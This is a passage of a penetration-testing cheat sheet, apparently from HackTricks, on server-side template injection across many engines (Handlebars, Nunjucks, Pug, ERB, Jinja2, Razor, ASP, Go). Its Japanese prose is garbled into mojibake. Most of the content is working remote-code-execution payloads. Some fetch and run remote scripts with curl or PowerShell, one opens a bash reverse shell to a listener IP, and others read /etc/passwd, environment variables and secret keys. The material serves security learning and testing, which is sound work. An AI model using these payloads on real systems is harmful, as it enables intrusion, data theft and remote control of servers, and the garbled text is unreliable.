curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= ã‚¨ãƒ©ãƒ¼
* ${7\*7} = ${7\*7}
* ä½•ã‚‚ãªã—
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**è©³ç´°æƒ…å ±**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ** | **èª¬æ˜**                               |
| ---------------- | -------------------------------------- |
|                  | å‡ºåŠ›ã‚’è©•ä¾¡ã—ã€ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹         |
|                  | HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸå‡ºåŠ›ã‚’è©•ä¾¡ã—ã€ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ |
|                  | ã‚³ãƒ¡ãƒ³ãƒˆ                               |
| and              | ã‚³ãƒ¼ãƒ‰ã‚’è¨±å¯ã™ã‚‹ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ç„¡åŠ¹ï¼‰ |

* \= 49

**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**è©³ç´°æƒ…å ±**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®ä¾‹**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**è©³ç´°æƒ…å ±**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = å‡ºåŠ›ãªã—
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = ã‚¨ãƒ©ãƒ¼
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**è©³ç´°æƒ…å ±**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = ã‚¨ãƒ©ãƒ¼`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**è©³ç´°æƒ…å ±**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**è©³ç´°æƒ…å ±**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Pythonã§ã®**ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œã‚’ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦è¡Œã†**ãƒˆãƒªãƒƒã‚¯ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = ã‚¨ãƒ©ãƒ¼`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}





{{os.system('whoami')}}
{{os.system('whoami')}}
```
**è©³ç´°æƒ…å ±**

### Jinja2 (Python)

[å…¬å¼ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ](http://jinja.pocoo.org)

> Jinja2ã¯Pythonç”¨ã®ãƒ•ãƒ«æ©Ÿèƒ½ã‚’å‚™ãˆãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã™ã€‚å®Œå…¨ãªãƒ¦ãƒ‹ã‚³ãƒ¼ãƒ‰ã‚µãƒãƒ¼ãƒˆã‚’æŒã¡ã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§çµ±åˆã•ã‚ŒãŸã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å®Ÿè¡Œç’°å¢ƒãŒã‚ã‚Šã€åºƒãä½¿ç”¨ã•ã‚Œã¦ãŠã‚ŠBSDãƒ©ã‚¤ã‚»ãƒ³ã‚¹ã®ä¸‹ã§æä¾›ã•ã‚Œã¦ã„ã¾ã™ã€‚

* `{{7*7}} = ã‚¨ãƒ©ãƒ¼`
* `${7*7} = ${7*7}`
* `{{foobar}} ä½•ã‚‚ãªã—`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}




{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå½¢å¼**
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**`__builtins__`ã«ä¾å­˜ã—ãªã„**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) RCEï¼š
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Jinjaã®æ‚ªç”¨æ–¹æ³•ã«ã¤ã„ã¦ã®è©³ç´°**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= æˆåŠŸ`
* `@() <= æˆåŠŸ`
* `@("{{code}}") <= æˆåŠŸ`
* `@ <=æˆåŠŸ`
* `@{} <= ã‚¨ãƒ©ãƒ¼ï¼`
* `@{ <= ã‚¨ãƒ©ãƒ¼ï¼`
* `@(1+2)`
* `@( //C#ã‚³ãƒ¼ãƒ‰ )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

.NETã®`System.Diagnostics.Process.Start`ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’é–‹å§‹ã—ã€webshellã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚è„†å¼±ãªwebappã®ä¾‹ã¯[https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**è©³ç´°æƒ…å ±**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = ä½•ã‚‚ãªã—
* `<%= response.write(date()) %>` = \<æ—¥ä»˜>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**è©³ç´°æƒ…å ±**

* [https://www.w3schools.com/asp/asp_examples.asp](https://www.w3schools.com/asp/asp_examples.asp)

### Mojolicious (Perl)

Perlã‚’ä½¿ç”¨ã—ã¦ã„ã¦ã‚‚ã€Rubyã®ERBã®ã‚ˆã†ãªã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

* `<%= 7*7 %> = 49`
* `<%= foobar %> = ã‚¨ãƒ©ãƒ¼`
```
<%= perl code %>
<% perl code %>
```
### GOã«ãŠã‘ã‚‹SSTI

ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ãŒGoã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š

* `{{ . }}` = ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¸ã®å…¥åŠ›ã¨ã—ã¦æ¸¡ã•ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿æ§‹é€ 
* æ¸¡ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ãŒä¾‹ãˆã°Passwordå±æ€§ã‚’å«ã‚€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã§ã‚ã‚‹å ´åˆã€å‰è¿°ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ãã‚Œã‚’æ¼æ´©ã•ã›ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ãŒã€`{{ .Password }}`ã¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
* `{{printf "%s" "ssti" }}` = å¿œç­”ã§æ–‡å­—åˆ—sstiã‚’å‡ºåŠ›ã™ã‚‹ã¯ãšã§ã™
* `{{html "ssti"}}`, `{{js "ssti"}}` = "js"ã‚„"html"ã¨ã„ã†å¾Œç¶šã®å˜èªãªã—ã§æ–‡å­—åˆ—"ssti"ã‚’å‡ºåŠ›ã™ã‚‹ã¯ãšã®ä»–ã®ã„ãã¤ã‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã™ã€‚ã‚¨ãƒ³ã‚¸ãƒ³å†…ã®ã•ã‚‰ãªã‚‹ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã«ã¤ã„ã¦ã¯[ã“ã¡ã‚‰](https://golang.org/pkg/text/template)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

**XSSã®æ‚ªç”¨**

ã‚µãƒ¼ãƒãƒ¼ãŒ**text/template**ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’**ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆ**ã€å…¥åŠ›ã¨ã—ã¦**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’**å˜ç´”ã«**æä¾›ã™ã‚‹ã“ã¨ã§XSSã‚’éå¸¸ã«ç°¡å˜ã«å®Ÿç¾ã§ãã¾ã™ã€‚ã—ã‹ã—ã€**html/template**ã®å ´åˆã¯å¿œç­”ã‚’HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã€ãã†ã¯ã„ãã¾ã›ã‚“ï¼š`{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

ã—ã‹ã—ã€Goã§ã¯**å…¨ä½“ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’DEFINEã—ã¦ã€å¾Œã§ãã‚Œã‚’å‘¼ã³å‡ºã™**ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**RCEã®æ‚ªç”¨**

html/templateãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯[ã“ã¡ã‚‰](https://golang.org/pkg/html/template/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€text/templateãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯[ã“ã¡ã‚‰](https://golang.org/pkg/text/template/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã—ã¦ã¯ã„ã€ãã‚Œã‚‰ã¯å¤§ããç•°ãªã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€**text/template**ã§ã¯ã€"call"å€¤ã‚’ä½¿ã£ã¦**ä»»æ„ã®å…¬é–‹é–¢æ•°ã‚’ç›´æ¥å‘¼ã³å‡ºã™**ã“ã¨ãŒã§ãã¾ã™ãŒã€html/templateã§ã¯ãã†ã¯ã„ãã¾ã›ã‚“ã€‚

Goã§SSTIã‚’ä»‹ã—ã¦RCEã‚’è¦‹ã¤ã‘ãŸã„å ´åˆã€`{{ . }}`ã§ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«æ¸¡ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã€**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™**ã“ã¨ã‚‚ã§ãã‚‹ã“ã¨ã‚’çŸ¥ã£ã¦ãŠãã¹ãã§ã™ã€‚ã—ãŸãŒã£ã¦ã€æ¸¡ã•ã‚ŒãŸ**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«Systemã¨ã„ã†ãƒ¡ã‚½ãƒƒãƒ‰ãŒã‚ã‚Š**ã€ä¸ãˆã‚‰ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å ´åˆã€`{{ .System "ls" }}`ã§ãã‚Œã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚\
ãã®ãŸã‚ã€ãŠãã‚‰ã**ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒå¿…è¦ã«ãªã‚‹**ã§ã—ã‚‡ã†ã€‚ãã®ã‚ˆã†ãªã‚‚ã®ã®æ½œåœ¨çš„ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**è©³ç´°æƒ…å ±**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### ãã®ä»–ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) ã§ã•ã‚‰ã«å¤šãã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ã¾ãŸã€[https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI) ã§èˆˆå‘³æ·±ã„ã‚¿ã‚°æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## é–¢é€£ã™ã‚‹ãƒ˜ãƒ«ãƒ—

å½¹ç«‹ã¤ã¨æ€ã‚ã‚Œã‚‹å ´åˆã¯ã€ä»¥ä¸‹ã‚’èª­ã‚“ã§ãã ã•ã„:

* [Flask ã®ã‚³ãƒ„](../../network-services-pentesting/pentesting-web/flask.md)
* [Python ãƒã‚¸ãƒƒã‚¯é–¢æ•°](broken-reference/)

## ãƒ„ãƒ¼ãƒ«

{% embed url="https://github.com/Hackmanit/TInjA" %}

{% embed url="https://github.com/epinna/tplmap" %}

{% embed url="https://github.com/Hackmanit/template-injection-table" %}

## ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ¤œå‡ºãƒªã‚¹ãƒˆ

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## ç·´ç¿’ã¨å‚è€ƒè³‡æ–™

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) ã¯ã€**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é‡è¦ãªã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚æŠ€è¡“çš„ãªçŸ¥è­˜ã®æ™®åŠã‚’ãƒŸãƒƒã‚·ãƒ§ãƒ³ã¨ã—ã¦ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ãŒé›†ã¾ã‚‹æ´»ç™ºãªäº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ã§ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã«åºƒå‘Šã‚’æ²è¼‰ã—ãŸã„**ã€ã¾ãŸã¯ **HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã® PEASS & HackTricks ã‚°ãƒƒã‚º**](https://peass.creator-spring.com) ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFT**](https://opensea.io/collection/the-peass-family) ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã® GitHub ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>
